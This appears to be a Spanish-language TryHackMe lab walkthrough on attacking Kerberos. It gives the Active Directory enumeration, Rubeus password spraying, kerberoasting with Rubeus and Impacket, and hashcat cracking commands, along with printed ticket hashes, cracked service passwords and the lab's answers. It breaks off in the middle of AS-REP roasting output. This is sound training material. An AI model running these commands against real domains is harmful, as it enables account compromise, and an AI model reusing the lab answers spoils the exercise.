@@ -1,0 +1,757 @@
+Attacking Kerberos / Golden Ticket
+
+URL:   https://tryhackme.com/room/attackingkerberos
+
+
+
+
+**1.Enumeración puertos:**
+**Escaneo General:**
+
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.109.226
+
+**Sintaxis:**
+----------------------------------------------------------------
+-p-:   Escanea todo el rango de puertos
+----------------------------------------------------------------
+
+--open:   Mostrar solo puertos abiertos
+
+----------------------------------------------------------------
+
+-sS:   Escaneo TCP sin port Scan para escaneo más rápido y sigiloso 
+
+------------------------------------------------------------------------------
+
+--min-rate “X”:   Tramitar paquetes no más lentos de “X” paquetes por segundo
+
+------------------------------------------------------------------------------
+
+-vvv:   Mostrar resultados sobre la marcha
+
+----------------------------------------------------------------
+
+-n:   Evitar que se aplique resolución DNS
+
+----------------------------------------------------------------
+
+-Pn:   Saltar descubrimiento de Hosts**  
+
+----------------------------------------------------------------
+
+Con este escaneo conseguimos ver que puertos podemos utilizar, para posteriormente analizarlos en el escaneo específico.
+
+
+
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+**Escaneo Específico:**
+
+nmap -sC -sV -p22, 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 5985, 9389, 47001
+
+
+
+
+**Sintaxis:**
+
+----------------------------------------------------------------
+
+-sV:   Ejecutar scripts básicos de reconocimiento (populares)
+
+----------------------------------------------------------------
+
+-sV:   Detectar versión y servicio de cada puerto indicado
+
+----------------------------------------------------------------
+
+Resultados escaneo específico:
+
+******************************************************************
+
+******************************************************************
+
+PORT      STATE SERVICE       VERSION
+
+22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+
+| ssh-hostkey:
+
+|   2048 68:f2:8b:17:15:7c:90:d7:4e:0f:8e:d1:4c:6a:be:98 (RSA)
+
+|   256 b0:3a:a7:c3:88:2e:c1:0b:d7:be:1e:43:1c:f7:5b:34 (ECDSA)
+
+|_  256 03:c0:ee:58:32:ae:6a:cc:8e:1a:7d:8b:20:c8:a2:bb (ED25519)
+
+53/tcp    open  domain        Simple DNS Plus
+
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-14 12:23:26Z)
+
+135/tcp   open  msrpc         Microsoft Windows RPC
+
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
+
+445/tcp   open  microsoft-ds?
+
+464/tcp   open  kpasswd5?
+
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+
+636/tcp   open  tcpwrapped
+
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
+
+3269/tcp  open  tcpwrapped
+
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+
+|_ssl-date: 2023-01-14T12:23:41+00:00; -1s from scanner time.
+
+| rdp-ntlm-info:
+
+|   Target_Name: CONTROLLER
+
+|   NetBIOS_Domain_Name: CONTROLLER
+
+|   NetBIOS_Computer_Name: CONTROLLER-1
+
+|   DNS_Domain_Name: CONTROLLER.local
+
+|   DNS_Computer_Name: CONTROLLER-1.CONTROLLER.local
+
+|   Product_Version: 10.0.17763
+
+|_  System_Time: 2023-01-14T12:23:33+00:00
+
+| ssl-cert: Subject: commonName=CONTROLLER-1.CONTROLLER.local
+
+| Not valid before: 2023-01-13T12:08:47
+
+|_Not valid after:  2023-07-15T12:08:47
+
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+
+|_http-title: Not Found
+
+|_http-server-header: Microsoft-HTTPAPI/2.0
+
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+
+|_http-title: Not Found
+
+|_http-server-header: Microsoft-HTTPAPI/2.0
+
+Service Info: Host: CONTROLLER-1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+
+| smb2-time:
+
+|   date: 2023-01-14T12:23:36
+
+|_  start_date: N/A
+
+| smb2-security-mode:
+
+|   3.1.1:
+
+|_    Message signing enabled and required
+
+******************************************************************
+
+1.1. What does TGT stand for?
+Ticket Granting Ticket
+
+1.2 What does SPN stand for?
+Service Principal Name
+
+1.3 What does PAC stand for?
+Privilege Attribute Certificate
+
+1.4 What two services make up the KDC?
+AS, TGS
+
+
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+
+
+2.Enumeración Kerbrute:
+
+Para poder trabajar correctamente con Kerbrute, es necesario agregar el DNS de la máquina a /etc/hosts:
+
+10.10.109.226  CONTROLLER.local
+
+***************************************************
+
+**Instalación Kerbrute**
+
+1º Descargar el recurso desde:
+
+[https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)
+
+2º Renombrar a un nombre más coherente:
+
+mv kerbrute_linux_am64 kerbrute
+
+3º Darle permisos de ejecución:
+
+chmod +x kerbrute
+
+***************************************************
+
+Para comenzar a enumerar con kerbrute, utilizaré la siguiente wordlist:
+
+[https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt)
+
+
+
+Mediante el siguiente comando inicio la enumeración:
+
+./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
+(User.txt siendo la wordlist que anteriormente hemos descargado)
+
+
+**2.1. How many total users do we enumerate?**
+10
+
+**2.2. What is the SQL service account name?**
+sqlservice
+
+**2.3. What is the second "machine" account name?**
+Machine2
+
+**2.4. What is the third "user" account name?**
+User3
+
+
+
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+
+
+**3.Recolección de tickets y fuerza bruta con Rubeus:**
+
+**////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\**
+
+**Para comenzar esta tarea se debe conectar con RDP o SSH hacia la máquina mediante:**
+
+Username: Administrator 
+
+Password: P@$$W0rd 
+
+Domain: controller.local
+
+En la siguiente IP: 10.10.109.226
+
+////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\
+
+Para poder realizar esta fase, voy a utilizar esta herramienta de HarmJ0y llamada Rubeus para atacar a kerberos:
+
+[https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
+
+Ya conectados en la máquina víctima, vamos a Descargas, donde colocaremos el Rubeus si no está descargado y lo ejecutaremos con el siguiente comando:
+
+Rubeus.exe harvest /interval:30
+
+“Este comando solicita TGT´s cada 30 segundos.”
+
+
+En este punto, procedo a agregar el propio equipo víctima al fichero hosts del equipo:
+
+echo 10.10.109.226 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
+
+
+
+Ya estamos listos para lanzar un ataque de fuerza bruta con Rubeus mediante la contraseña Password1:
+
+Rubeus.exe brute /password:Password1 /noticket
+
+(este comando nos va a hacer un barrido por todas las cuentas con la contraseña proporcionada)
+
+
+
+3.1. Which domain admin do we get a ticket for when harvesting tickets?
+administrator
+
+3.2. Which domain controller do we get a ticket for when harvesting tickets?
+controller-1
+
+
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+
+
+4.Kerberoasting con Rubeus & Impacket:
+**Método 1 – Rubeus**
+
+
+Empezamos ejecutando Rubeus en el parámetro kerberoast en el equipo víctima:
+
+Rubeus.exe kerberoast
+
+***************************************************************
+
+   ______        _
+
+  (_____ \      | |
+
+   _____) )_   _| |__  _____ _   _  ___ 
+
+  |  __  /| | | |  _ \| ___ | | | |/___)
+
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+
+  |_|   |_|____/|____/|_____)____/(___/ 
+
+  v1.5.0
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Searching the current domain for Kerberoastable users
+
+[*] Total kerberoastable users : 2
+
+[*] SamAccountName         : SQLService
+
+[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local 
+
+[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
+
+[*] PwdLastSet             : 5/25/2020 10:28:26 PM
+
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+
+[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca
+
+                             l:30111*$917128FFFB2B0F81AAB4D3CC67CFDE3D$F8DC53EF21ADB3362DB57F850F57E1267994E2
+
+                             5C54466534981A4B13365AB8925BE5419FDE321B8B8D9494263AA06EC4C023C10CECCFDD8CC16B5B
+
+                             648EF844085F2A73A4FE76B890830A25E9CED3DD4B930AED2588B16052933D9FD6D177462CDD85EE
+
+                             28645C040EDD4BFFD9DFA5B51911389C7C1425149DA81E24F3E93CFF6E3E2034A5FBFDDDA88C515B
+
+                             009C0B58820AF78B23A05D14D1F28B2CBADC54308124A13518E834BEA27E34C251E0FE7C8F81907E
+
+                             1D32E2C47F44441E56CA62BBCFF7B03D295BF00F89AEBEB233570EF2DC091627671742397158915C
+
+                             4FA6CF6B002DBC931DBA14B828F8C7CC7A80A1523DBC9AD96DD9481117E20EB1EB31715903FC48E8
+
+                             3A1D8FBC8C529CC4E1C43C553872021F4D2756D9FF6EC82885402B85A6D0DC966C02F3A154068F3C
+
+                             DA48FFB0B7490C06AD1B99238A5820A6CA950203D9DC59FF0C3DFF916CD6A7EC16C0021D14467BBB
+
+                             A023295C87CF7B4630ACDB0DCDF31A1A75388081C5BFBD57AA152D24096072F51EE529E6170B31EC
+
+                             04A147F560BFA1EE12AEB35EFE987F4148C84EE2724D437502CE937FACE529EE8AB14842FA78157A
+
+                             7380EEFB7AACEB5B109F6594DB6C562F8C88F2970307E3F09DF501278B04281B66EF3F67FF2DDBE6
+
+                             17634E3118039A52C546C727ACA33EE581BF3DCE5DECB17DC3803BA525FF5356AD961D0933909A22
+
+                             B5047BAF509F15BE61D19840FA9D1994D39F3057FAD21EAAA12CD4DC1341645D136666BC632F6187
+
+                             CD286AF4019AACF5932CE4434523919EA689B2B70D0DCD44C4C838FEEAE6FD1B3FFCAE13A1E4EED9
+
+                             612CEF4222151ABB06B95CD87CDDB80283AD52D9DE687D7F9DB60062266139B1BF024974B4B5BC74
+
+                             E5E359A87562E39BE9CBBA602451B4C88D0A4079A2DEF7832AC044CA8FE71DB0D8F55C8D85F61A81
+
+                             EACFE96F9F7348E954D82E55D37CB9E5A7A0A7EA4652841FD227172B1D34922D3F0842E9D4BB4BB2
+
+                             E1DDB89E2C8AE298F9A9B56AC94FCDC16161DA25D410BB56FA734C553E311D1FAE391E0F3C01F7AF
+
+                             20021996EE7A920F623B09221B1727383E1A32B4B00CA713A86ED05368245DC83235530973E0101A
+
+                             2114DEAADE5E50C66D0C841AA02789DC5C86BF64B9AF17BBD618C3D3C225B0B537C73595212E04A0
+
+                             BE6FA413F5D0A20D8C12C1AE8C882CC35737732FCF11B24F0003D29EA4EDA767931815177EEDD42E
+
+                             BB37A5A05DCDD814625667CF9FD2A5A4414557B42A208618195800D592740574DC7965315588911F
+
+                             BFEA7976C78FDA0FB2FFAA5DF99CB25DF7E0981093B49470A44C45AA6D0683A3E2E10F51BD8EF8D1
+
+                             1CB679F421A447625B6511368B39D5D58B12B6804D1B631FE56AF1CEF024A9C715C86A523D0C48D9
+
+                             EA1C512FACDA4C83A23F961DBDA7CDF2EDB4D50BF8F1E40617C9141E67191CBC20FF619F6729E060
+
+                             36411B65CE04400CA1C16E89C360D399769E6B9F4C5D3ED788474B68FC811E4B851DB081C9525C45
+
+                             84014E1D7278D294BE6458358D99C94ED4B8A090986A64DBD447564038E5E6E13234BF7949438B61
+
+                             EFB5C4B24C7F4FE807F57D9C788053A383008E9776C4F3E339F56DE36A604CDAB1D487A7AB1B9452
+
+                             BF2AE54A4B6064BC2590C81FEA5208B75AAAF3806789EA51BD2AA5DAE5
+
+[*] SamAccountName         : HTTPService
+
+[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
+
+[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
+
+[*] PwdLastSet             : 5/25/2020 10:39:17 PM
+
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+
+[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
+
+                             cal:30222*$978834534888DB171598A92E9D46A62E$58356A16BC031B604EB123233D420E5D6600
+
+                             D4B98032091FA032A0E70DB86E0D4224F1CE48424E48976651A818B143E5BF8B4E663728FA71FDAE
+
+                             A22A4E67C6143AE0E0819626A5253E4A7801FAF40F7B284911D98413A0229DE8699FA52A1820FA03
+
+                             7BCFC84A0FB2BEAA41C43FF11543591D728837AA7991F8F72EE598783821D96D1E0CEF60F8EF2C0D
+
+                             E82072B78A63039D50A174502BD0190D6B866BEC2AB9AC5690A7AD8AC208658D6283BA306B78E0F1
+
+                             B912F2FAC65B0F263460E65F726D01834870478459E835A9D7E439587A3D63CA1FBAF6B084C2840C
+
+                             3BB81BBAEF92893A3EC7761DE8206E62E3436A2F0287CFCD3160BA1AC953D0DAAEF1120B373CB2C0
+
+                             892D1A1C3B3F890E1237AF73AAE0A4825A1994FA19F04EB82C268CC214D3F22B543F88CBE2DB4DD2
+
+                             43636A3FB70FFB6650D8F85B073FF66309AEC8050E1A54A17292D2E68505F3D3759CB328F8459A99
+
+                             25C7D0D2D4F8252445E2D83B50D7C002413FC440E63602BDC63BF042B3AD81DEFE3B55310AD41697
+
+                             DC9DC72F184B0D449AB02F3B56D1F39066BB66BC3631F426714279F2F1CC196E0AD53B34BD5AB753
+
+                             D82CE0D106574FA0F5C23C323667C9908F8DE0677E40F48189CF114290CDD0A5AF62680997D93A3E
+
+                             378E5A30B4D62D3F6A561AF07157CF5832C1D608F907F9A89AD9ABD7A953B4679886D2C6A761618E
+
+                             6E89FEA3EBF3CF207181CA2DFD101F4B1AAB68FF05AA322A9BF0169D8FB157D45372BF798D73D974
+
+                             7418A5D4BFE0706D90DD8DC7F9ABAF02604F65DBB40C204B2C17FEFB5E07F45AB5B76D1950492731
+
+                             4CCA62E97D896ACCA3810FF7EEA921019BB9E21ABF0A22B0C91ACBD5008AF650A70D75DE2B9CB1D0
+
+                             866A9D636EEFD8849FDA7C136A15A9F199E92A0318C8E88DF1D10768E696DE5F729C48501EDB0756
+
+                             9DD59000A51C5A96E060AD46ECFFD9A15062084C2263940FE569FA5BB4AB3A352FE259A656B0192E
+
+                             F47617B45334643D3383BFDE1B6DB394CE26B1C52ACE3C40D73BEB97CB6319A461CE715A252D6671
+
+                             A1E11759061F51247364FD96E5FCEC2D99D1D641C1B267719562BD285E53016D322555016B0DF7D3
+
+                             83807EE75B022CB5350C5A981D5F4C1EBDD009B0FF9984DCFA8EDE8AD40856B701447117CEC7B44A
+
+                             F6276DE8EF71F2E95C334A23840D6EB7322204E349AFA5CF5E289F1724EC6A8CF1F83653656952CD
+
+                             EAC3CC2EE107206135B083DE3F7D54FA7C0C35F11B70DECCC064C090C3CDFAF9BC69F8226B18C5B6
+
+                             B7CC633631B4C4BE2D8312DB5D9F5340D6E42EC11105643939C3E506E8FD76B117BBF07C2D8D4FE6
+
+                             C4D81AB2DDEA741DCD2D210D1D96476FD721852BC093CA9B58182C8EB92D6AC076090CBA088BB2C9
+
+                             839B2774EB14DB18E54813841242EB996CF6F86A71ED64F24365EA45F31A9647A1893B63530C0C58
+
+                             EB9A7F1B28BB195FAE86461E0F83D97315F8A232B85B84DE8395C6C6653C7C0D52D5C5C46B570F30
+
+                             523FC75D50F5A5B07064CB9DE5348EB097A9E66DE377619B0607EDFEC7425CE57944B87DB43B98EA
+
+                             29221B9C76D8A5AC8CE43A8B52B09EFD8BD181EA9136539041D7E58B02AAC09FB32BB14608B80BEE
+
+                             8C10C7FC1DD069D384DCDF79B36FC4F4B2A69EFBAB8F5C7C714E4D46B60A
+
+       ***************************************************************
+
+**Procedemos a copiar el hash de SQLservice en un .txt para posteriormente crackearlo con hashcat.**
+
+**En mi caso, utilizaré el comando:**
+
+hashcat -m 13100 -a 0 ./hash.Rubeus.txt /usr/share/wordlists/rockyou2.txt –force
+
+**Nos devuelve lo siguiente para SQLservice:**
+
+*************************************************************
+
+$krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local:30111*$5d1ff177457c5fbd7c983fbca886bb11$88108830467467e31a983dd4591e44be43b1a044e7bef903ab3a6a5a54bb41b46977cad4a7bc2e6d9af969db5ad6b19a81270a000229f6eb1ff6ab6b55a7bf493af40c640b28733e649094c3d8ced604b097cc3000ac65c0ff0b1a8075ee7846927c8bdca264834e89d72355213c5344b1a8df4749b941ccc79e6c4fa98e132413cb3c07605cc3f394f49b4096d7eca9b720066370e2ac0ea7bf7de99359668cf0a0220ea1cc4f3e7ac8b5c1599a40970cc013a0a23f56d509ddcb942ee94f86d8da5e41f9809a89548940fd05165c09f183f4c7da8fed567d90362cfe93c24faba877244053f0d8a7a025ecb8fd018b9ec1ded4bdd548c693923fc1ee9658a4cff5a3ad73d5613f4ca0fbddfbebfaf61aae5e48dc999851560358d5bf92346f8b55e68056c7cf89eb97136272c5fb9092b6872a3c4ee00193a1b124593bb29ff20e5fd5b9d2c2141f615ca472ffb0dbf08d681ef86315bb8bf68743e00fe3a7fcf9d00d94ec05059f894f20660b0a3500e9c089952bc94063ee1d66e3312d9bae626509ee5da52d70cb02d690e2606fdd586cc6ba0ec6ff1c03666e355f19ffbe749ab994930de11a9066389eb3b66c78ee9403a0e749d2bdd4ed48ba52e8efd53a776bcee182cc9a3446cdcc9b0f9fb84eb03a0f2debd1e193459eab87827f522ceebccb8b726749e4cd1179b6fedbdf4ce374362c4215158569a32cfb275791d27faa93972a8fecea3533ce2e58dd6576c7f757a672c448b2b92cc74c9f5ed50489372986055496a3390316a888f76fa57fb49a050b5ad481f652da23f226cb70bbf4ba187b80e3c01ff4986841329c59e790142ea1a000c92891b47ccf8693e988a717db29381f7fe33c093d56b747bd06842344583c0112a753c653f16c67348d485827c3d5235b24d8209246f9597a9dac0e4edaef8b91a7e01b43969f0d8264dcefca438542af2fc0e3dd80cdf17d0244e3df794ac38a595b83040c104c08498884b478a1f81d9724054402744714a28db74a03d709189a58846085cc3c93763d78fd18268b0ee356e450f5340961078af97ce519edae5d03bd2470ed6d325c294470ef71bbfd7d81896b338ba5f120030c09802b700e66048c5fad6ba2ecda49bf80e94a1c7b508ad1d12a6491c8c8e142c1f8c065aaeaa25419fa196adcab0b61cb34c6f5950a245605aa8a00df9203a89f68bc6114d922bb81435ea05af1302d45ea0bac20a016d4c0263198ce2c1cbb8bfe8b5f90d7202332cad8630f9556f3b6981c930d946b0318006996116449c65ad1d78f345190933f325dd7ae145d1611f13875fa8d22f27f1916acd98f3d51bd8ddf200ff21d67d19e7d1ccdd1c3a0ea334285924dbe39aa10f305f7979e79bc0e435f4a9f1683ba89b76a3d2f4139a1588e349ba9112032fa4ecb267163acb59b069b7654b481a564f50c91b7c0de72bdf6bc67dd07cd8a560c8574bba633095ae722ff9cbfb75d137324d3a7ef88b66c999a3e1961b5cf6826062f5b909c5d92fde78d57eb691c7961f05a4ec7e45d24c7bccb687e3c764eac3b30db42a960f0cf087d849ad5b3f7ba2d14f4fb9e280016a887bfc4a47f935926b5452f144a89bdae20e1ac26206b62aa2795891e5a57f1044d9e0de793c376:**MYPassword123#**
+
+*************************************************************
+
+**Nos devuelve lo siguiente para HTTPService:**
+
+$krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.local:30222*$978834534888db171598a92e9d46a62e$58356a16bc031b604eb123233d420e5d6600d4b98032091fa032a0e70db86e0d4224f1ce48424e48976651a818b143e5bf8b4e663728fa71fdaea22a4e67c6143ae0e0819626a5253e4a7801faf40f7b284911d98413a0229de8699fa52a1820fa037bcfc84a0fb2beaa41c43ff11543591d728837aa7991f8f72ee598783821d96d1e0cef60f8ef2c0de82072b78a63039d50a174502bd0190d6b866bec2ab9ac5690a7ad8ac208658d6283ba306b78e0f1b912f2fac65b0f263460e65f726d01834870478459e835a9d7e439587a3d63ca1fbaf6b084c2840c3bb81bbaef92893a3ec7761de8206e62e3436a2f0287cfcd3160ba1ac953d0daaef1120b373cb2c0892d1a1c3b3f890e1237af73aae0a4825a1994fa19f04eb82c268cc214d3f22b543f88cbe2db4dd243636a3fb70ffb6650d8f85b073ff66309aec8050e1a54a17292d2e68505f3d3759cb328f8459a9925c7d0d2d4f8252445e2d83b50d7c002413fc440e63602bdc63bf042b3ad81defe3b55310ad41697dc9dc72f184b0d449ab02f3b56d1f39066bb66bc3631f426714279f2f1cc196e0ad53b34bd5ab753d82ce0d106574fa0f5c23c323667c9908f8de0677e40f48189cf114290cdd0a5af62680997d93a3e378e5a30b4d62d3f6a561af07157cf5832c1d608f907f9a89ad9abd7a953b4679886d2c6a761618e6e89fea3ebf3cf207181ca2dfd101f4b1aab68ff05aa322a9bf0169d8fb157d45372bf798d73d9747418a5d4bfe0706d90dd8dc7f9abaf02604f65dbb40c204b2c17fefb5e07f45ab5b76d19504927314cca62e97d896acca3810ff7eea921019bb9e21abf0a22b0c91acbd5008af650a70d75de2b9cb1d0866a9d636eefd8849fda7c136a15a9f199e92a0318c8e88df1d10768e696de5f729c48501edb07569dd59000a51c5a96e060ad46ecffd9a15062084c2263940fe569fa5bb4ab3a352fe259a656b0192ef47617b45334643d3383bfde1b6db394ce26b1c52ace3c40d73beb97cb6319a461ce715a252d6671a1e11759061f51247364fd96e5fcec2d99d1d641c1b267719562bd285e53016d322555016b0df7d383807ee75b022cb5350c5a981d5f4c1ebdd009b0ff9984dcfa8ede8ad40856b701447117cec7b44af6276de8ef71f2e95c334a23840d6eb7322204e349afa5cf5e289f1724ec6a8cf1f83653656952cdeac3cc2ee107206135b083de3f7d54fa7c0c35f11b70deccc064c090c3cdfaf9bc69f8226b18c5b6b7cc633631b4c4be2d8312db5d9f5340d6e42ec11105643939c3e506e8fd76b117bbf07c2d8d4fe6c4d81ab2ddea741dcd2d210d1d96476fd721852bc093ca9b58182c8eb92d6ac076090cba088bb2c9839b2774eb14db18e54813841242eb996cf6f86a71ed64f24365ea45f31a9647a1893b63530c0c58eb9a7f1b28bb195fae86461e0f83d97315f8a232b85b84de8395c6c6653c7c0d52d5c5c46b570f30523fc75d50f5a5b07064cb9de5348eb097a9e66de377619b0607edfec7425ce57944b87db43b98ea29221b9c76d8a5ac8ce43a8b52b09efd8bd181ea9136539041d7e58b02aac09fb32bb14608b80bee8c10c7fc1dd069d384dcdf79b36fc4f4b2a69efbab8f5c7c714e4d46b60a:**Summer2020**
+
+
+
+
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+
+
+
+
+
+
+**Método 2 – Impacket**
+
+-------------------------
+
+**INSTALAR IMPACKET:**
+
+1. cd /opt navegar a esta ruta para posteriormente
+
+
+descargar el impacket
+2. Descargar impacket desde el github:
+[https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19)
+
+3. Cd /impacket-0.9.1.9
+
+4. pip install .
+
+
+
+Kerberosing con impacket:
+
+1º Vamos a la ruta dentro de** /opt/impacket/examples/
+
+2º Vamos a ejecutar la herramienta de GetUserSPNs.py denteo de /examples/ para conseguir un dump de hashes de los usuarios kerberoseables
+
+Sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.109.226 -request
+
+3º Finalmente volvemos a crackear con hashcat el hash de kerberos como hicimos en el apartado anterior con Rubeus:
+
+hashcat -m 13100 -a 0 ./hash.Rubeus.txt /usr/share/wordlists/rockyou2.txt –force
+
+
+
+
+4.1. What is the HTTPService Password?
+Summer2020
+
+4.2. What is the SQLService Password?
+MYPassword123#
+
+
+
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+
+
+
+
+5.AS-REP Roasting mediante Rubeus:
+AS-REP Roasting ataca a usuarios de kerberos que tengan la pre-autenticación deshabilitada.
+
+**En este caso, utilizaré Rubeus para hacer un dump de los hashes KRBASREP5. Para ello, en la máquina víctima, utilizaremos el comando:**
+
+Rubeus.exe asreproast
+
+RESULTADO:
+
+**************************************************
+
+  ______        _
+
+  (_____ \      | |
+
+   _____) )_   _| |__  _____ _   _  ___
+
+  |  __  /| | | |  _ \| ___ | | | |/___)
+
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
